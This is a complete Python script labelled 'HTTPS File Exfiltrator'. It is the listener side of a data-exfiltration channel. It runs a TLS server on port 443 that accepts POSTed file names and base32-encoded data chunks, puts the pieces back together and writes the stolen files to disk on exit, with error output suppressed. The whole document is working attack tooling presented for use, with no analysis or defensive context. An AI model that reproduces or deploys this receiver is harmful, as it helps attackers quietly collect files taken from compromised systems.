#!/usr/bin/python3

import os
import ssl
import sys
import base64
import signal
import argparse
import warnings
import urllib.parse

from http.server import BaseHTTPRequestHandler, HTTPServer

def handle(sig, frame):
	print("\n[-] Exiting...")

	for x, y in files.items():
		y.write(base64.b32decode(data[x].encode()))

	print("[>] Saved")
	sys.exit()

post_count = 0

class Server(BaseHTTPRequestHandler):
	def do_POST(self):
		global post_count
		self.send_response(200)
		self.end_headers()
		body = self.rfile.read(int(self.headers["Content-Length"])).decode().split('&')
		tmp = ''
		for x in body:
			key, value = x.split('=', 1)
			value = urllib.parse.unquote_plus(value)
			if key == "file":
				tmp = value

			if value not in files and key == "file":
				files[value] = open(value, "wb")

			if key == "data":
				if tmp in data:
					data[tmp] += value
				else:
					data[tmp] = value

		post_count += 1
		print("[>] Packets received: %d" % post_count, end='\r')

if __name__ == '__main__':
	parser = argparse.ArgumentParser(description="HTTPS File Exfiltrator.", usage="%(prog)s <.pem certificate>")
	parser.add_argument("certificate", help=".pem certificate.", type=argparse.FileType('r'))
	args = parser.parse_args()

	sys.stderr = open(os.devnull, 'w')

	signal.signal(signal.SIGINT, handle)
	files = {}
	data = {}

	print("[>] Listening on 0.0.0.0:443")
	print("[>] Press CTRL+C to save and exit.")

	httpd = HTTPServer(("0.0.0.0", 443), Server)
	httpd.allow_reuse_address = True
	httpd.socket = ssl.wrap_socket(httpd.socket, certfile=args.certificate.name, server_side=1)
	httpd.serve_forever()